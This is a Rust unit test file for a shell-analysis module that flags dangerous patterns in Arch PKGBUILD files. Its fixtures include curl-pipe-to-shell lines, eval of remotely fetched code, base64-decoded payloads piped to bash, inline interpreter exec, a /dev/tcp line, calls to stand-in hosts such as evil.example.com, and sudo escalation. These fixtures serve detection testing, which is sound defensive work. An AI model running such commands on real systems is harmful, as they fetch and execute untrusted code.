//! Unit tests for `bash_ast` (kept out of the module file so the code stays readable).

use super::*;

#[test]
fn curl_pipe_shell_evasions_caught() {
    assert_eq!(curl_pipe_shell("curl -sSL https://x | sh"), Some(1));
    assert_eq!(curl_pipe_shell("wget -O- https://x | /bin/sh"), Some(1));
    assert_eq!(curl_pipe_shell("curl -sSL https://x | env bash"), Some(1));
    assert_eq!(curl_pipe_shell("curl -sSL https://x | \"sh\""), Some(1));
    assert_eq!(curl_pipe_shell("curl -sSL https://x | 'sh'"), Some(1));
    // bash string-concatenation evasion: literally "s" + "" + "h"
    assert_eq!(curl_pipe_shell("curl -sSL https://x | s\"\"h"), Some(1));
}

#[test]
fn curl_pipe_shell_clean_cases_not_flagged() {
    assert_eq!(curl_pipe_shell("curl -sSL https://x -o file.tar.gz"), None);
    assert_eq!(curl_pipe_shell("curl -sSL https://x | tee log.txt"), None);
    assert_eq!(curl_pipe_shell("# curl -sSL https://x | sh"), None);
}

#[test]
fn eval_remote_exec_caught_and_not_false_positive() {
    assert_eq!(eval_remote_exec("eval \"$(curl -sSL https://x)\""), Some(1));
    assert_eq!(eval_remote_exec("eval `wget -qO- https://x`"), Some(1));
    assert_eq!(eval_remote_exec("eval \"${some_array[@]}\""), None);
    assert_eq!(eval_remote_exec("# eval \"$(curl https://x)\""), None);
}

#[test]
fn sudo_escalation_caught_and_not_false_positive() {
    assert_eq!(sudo_escalation("sudo ./validator --init"), Some(1));
    assert_eq!(sudo_escalation("pkexec /tmp/helper"), Some(1));
    assert_eq!(sudo_escalation("doas sh -c id"), Some(1));
    // must NOT flag: not a command, just an array element / comment
    assert_eq!(sudo_escalation("makedepends=('sudo')"), None);
    assert_eq!(sudo_escalation("depends=('sudo' 'other')"), None);
    assert_eq!(sudo_escalation("# sudo ./validator"), None);
}

#[test]
fn decode_pipe_shell_base64_and_xxd_caught() {
    assert_eq!(decode_pipe_shell("base64 -d payload.b64 | sh"), Some(1));
    assert_eq!(
        decode_pipe_shell("base64 --decode payload.b64 | /bin/bash"),
        Some(1)
    );
    assert_eq!(
        decode_pipe_shell("echo \"$blob\" | base64 -d | env bash"),
        Some(1)
    );
    assert_eq!(decode_pipe_shell("xxd -r -p payload.hex | bash"), Some(1));
    assert_eq!(decode_pipe_shell("xxd -rp payload.hex | sh"), Some(1));
    // decoding but writing to a file, not a shell: must not flag
    assert_eq!(
        decode_pipe_shell("base64 -d payload.b64 -o payload.bin"),
        None
    );
    assert_eq!(
        decode_pipe_shell("base64 -d payload.b64 | tee out.bin"),
        None
    );
    // xxd without -p (default hex-dump-with-offsets format, not the
    // plain-hex encoding an attacker would actually stash a payload
    // in) shouldn't flag on -r alone
    assert_eq!(decode_pipe_shell("xxd -r dump.hex | sh"), None);
    assert_eq!(decode_pipe_shell("# base64 -d payload.b64 | sh"), None);
}

#[test]
fn source_process_subst_remote_caught_and_not_false_positive() {
    assert_eq!(
        source_process_subst_remote("source <(curl -sSL https://x)"),
        Some(1)
    );
    assert_eq!(
        source_process_subst_remote(". <(wget -qO- https://x)"),
        Some(1)
    );
    // a process substitution not fed to source/. shouldn't flag
    assert_eq!(
        source_process_subst_remote("diff <(curl -sSL https://x) file.txt"),
        None
    );
    // source-ing a local file shouldn't flag
    assert_eq!(source_process_subst_remote("source ./helpers.sh"), None);
    assert_eq!(
        source_process_subst_remote("# source <(curl https://x)"),
        None
    );
}

#[test]
fn python_inline_exec_caught_and_not_false_positive() {
    assert_eq!(
        python_inline_exec(
            "python3 -c \"import base64,os; exec(base64.b64decode(os.environ['P']))\""
        ),
        Some(1)
    );
    assert_eq!(python_inline_exec("python -c 'os.system(\"id\")'"), Some(1));
    assert_eq!(python_inline_exec("python3 -c 'print(1+1)'"), None);
    assert_eq!(python_inline_exec("python3 setup.py build"), None);
}

#[test]
fn perl_inline_exec_caught_and_not_false_positive() {
    assert_eq!(perl_inline_exec(r#"perl -e 'system("id")'"#), Some(1));
    assert_eq!(perl_inline_exec(r#"perl -e 'exec "/bin/sh"'"#), Some(1));
    assert_eq!(perl_inline_exec(r#"perl -E 'say qx/uname/'"#), Some(1));
    // benign one-liner used in real PKGBUILDs
    assert_eq!(perl_inline_exec(r#"perl -pe 's/foo/bar/'"#), None);
    assert_eq!(perl_inline_exec("perl Makefile.PL PREFIX=/usr"), None);
    assert_eq!(perl_inline_exec("# perl -e 'system(id)'"), None);
}

#[test]
fn ruby_node_lua_inline_exec_caught_and_not_false_positive() {
    assert_eq!(ruby_inline_exec(r#"ruby -e 'system("id")'"#), Some(1));
    assert_eq!(ruby_inline_exec(r#"ruby -e 'puts 1+1'"#), None);
    assert_eq!(
        node_inline_exec(r#"node -e 'require("child_process").exec("id")'"#),
        Some(1)
    );
    assert_eq!(node_inline_exec(r#"node -e 'console.log(1)'"#), None);
    assert_eq!(lua_inline_exec(r#"lua -e 'os.execute("id")'"#), Some(1));
    assert_eq!(lua_inline_exec(r#"lua -e 'print(1)'"#), None);
    assert_eq!(ruby_inline_exec("# ruby -e 'system(id)'"), None);
}

#[test]
fn shell_c_exec_catches_common_obfuscation() {
    assert_eq!(
        shell_c_exec(r#"sh -c 'curl -sSL http://evil/x | bash'"#),
        Some(1)
    );
    assert_eq!(
        shell_c_exec(r#"bash -c "eval \"\$(base64 -d <<< '...')\"""#),
        Some(1)
    );
    assert_eq!(shell_c_exec("dash -c 'wget -qO- http://x | sh'"), Some(1));
    assert_eq!(
        shell_c_exec(r#"/bin/bash -c 'python3 -c "import os; os.system(\"id\")"'"#),
        Some(1)
    );
    assert_eq!(shell_c_exec("sh -c '/dev/tcp/1.2.3.4/443'"), Some(1));
}

#[test]
fn shell_c_exec_catches_long_or_heavy_staging() {
    let long = "sh -c '".to_string() + &"a".repeat(170) + "'";
    assert_eq!(shell_c_exec(&long), Some(1));

    assert_eq!(
        shell_c_exec(r#"bash -c 'x=1; y=2; z=3; eval "$x$y$z"'"#),
        Some(1)
    );
}

#[test]
fn shell_c_exec_ignores_benign() {
    assert_eq!(shell_c_exec(r#"sh -c "make install""#), None);
    assert_eq!(shell_c_exec(r#"bash -c 'cmake --build .'"#), None);
    assert_eq!(shell_c_exec("sh -c 'ninja -C build'"), None);
    assert_eq!(shell_c_exec("# sh -c 'curl evil | bash'"), None);
    assert_eq!(shell_c_exec("echo 'sh -c evil'"), None);
}

#[test]
fn shell_c_exec_handles_combined_flags_and_concat() {
    assert_eq!(shell_c_exec(r#"sh -ec 'curl -s http://x | sh'"#), Some(1));
    // concatenation on the shell name itself
    assert_eq!(
        shell_c_exec(r#"s""h -c 'wget -qO- http://x | bash'"#),
        Some(1)
    );
}

#[test]
fn shell_c_exec_inside_function_is_still_caught() {
    let src = r#"
build() {
  cd "$srcdir"
  sh -c 'curl -sSL http://evil/stage2 | bash'
}
"#;
    assert_eq!(shell_c_exec(src), Some(4));
}

#[test]
fn top_level_command_substitution_caught_and_not_false_positive() {
    // the real repro: backticks left over from a markdown code span,
    // pasted straight into pkgdesc.
    assert_eq!(
        top_level_command_substitution(
            "pkgdesc=\"runs untrusted build steps inside a `bwrap` sandbox.\"\npkgver=1.0.0"
        ),
        Some(1)
    );
    assert_eq!(
        top_level_command_substitution("url=\"$(curl -s https://evil.example.com/x)\""),
        Some(1)
    );
    // legitimate: command substitution *inside* a function body only
    // runs when makepkg calls that function, not on a bare source.
    assert_eq!(
        top_level_command_substitution(
            "pkgver() {\n  cd \"$srcdir\"\n  git describe --long | sed 's/^v//'\n}\n"
        ),
        None
    );
    assert_eq!(
        top_level_command_substitution("pkgver() {\n  echo \"$(git describe)\"\n}\n"),
        None
    );
    assert_eq!(
        top_level_command_substitution("pkgdesc=\"a perfectly normal package\""),
        None
    );
    assert_eq!(
        top_level_command_substitution("# pkgdesc=\"$(curl https://x)\""),
        None
    );
}

#[test]
fn finds_findings_nested_inside_build_function() {
    let pkgbuild = r#"
pkgname=totally-legit-tool
pkgver=1.2.3
build() {
  cd "$srcdir"
  sudo ./validator --setup
  curl -sSL https://evil.example.com/x | /bin/sh
  eval "$(wget -qO- https://evil.example.com/y)"
}
"#;
    assert_eq!(sudo_escalation(pkgbuild), Some(6));
    assert_eq!(curl_pipe_shell(pkgbuild), Some(7));
    assert_eq!(eval_remote_exec(pkgbuild), Some(8));
}

#[test]
fn clean_pkgbuild_hits_nothing() {
    let clean = r#"
pkgname=foo
pkgver=1.2.3
pkgrel=1
source=("https://github.com/foo/foo/archive/v$pkgver.tar.gz")
sha256sums=('abc123')
build() {
  cd "$pkgname-$pkgver"
  make
}
package() {
  cd "$pkgname-$pkgver"
  make DESTDIR="$pkgdir" install
}
"#;
    assert_eq!(sudo_escalation(clean), None);
    assert_eq!(curl_pipe_shell(clean), None);
    assert_eq!(eval_remote_exec(clean), None);
    assert_eq!(python_inline_exec(clean), None);
    assert_eq!(shell_c_exec(clean), None);
}

#[test]
fn unparseable_input_falls_back_to_none_not_panic() {
    assert_eq!(curl_pipe_shell("{{{ not bash at all ]]]"), None);
}

#[test]
fn pkgbuild_dependencies_resolves_versioned_and_quoted_entries() {
    let pkgbuild = r#"
pkgname=foo
depends=('glibc>=2.38' "openssl" 'zlib=1:1.3-1')
makedepends=(cmake ninja)
checkdepends=()
"#;
    let mut deps = pkgbuild_dependencies(pkgbuild, "x86_64").unwrap();
    deps.sort();
    assert_eq!(deps, vec!["cmake", "glibc", "ninja", "openssl", "zlib"]);
}

#[test]
fn pkgbuild_dependencies_includes_current_arch_suffixed_array() {
    let pkgbuild = r#"
pkgname=foo
depends=('glibc')
depends_x86_64=('lib32-glibc')
depends_aarch64=('some-aarch64-only-lib')
"#;
    let mut deps = pkgbuild_dependencies(pkgbuild, "x86_64").unwrap();
    deps.sort();
    assert_eq!(deps, vec!["glibc", "lib32-glibc"]);
}

#[test]
fn pkgbuild_dependencies_none_when_no_arrays_present_is_empty_not_none() {
    let pkgbuild = "pkgname=foo\npkgver=1.0\nbuild() { make }\n";
    assert_eq!(pkgbuild_dependencies(pkgbuild, "x86_64"), Some(Vec::new()));
}

#[test]
fn pkgbuild_dependencies_bails_on_dynamic_element() {
    let pkgbuild = r#"
depends=('glibc' "$optional_dep")
"#;
    assert_eq!(pkgbuild_dependencies(pkgbuild, "x86_64"), None);
}

#[test]
fn pkgbuild_dependencies_bails_on_non_array_assignment() {
    let pkgbuild = r#"
_deplist="glibc openssl"
depends=$_deplist
"#;
    assert_eq!(pkgbuild_dependencies(pkgbuild, "x86_64"), None);
}
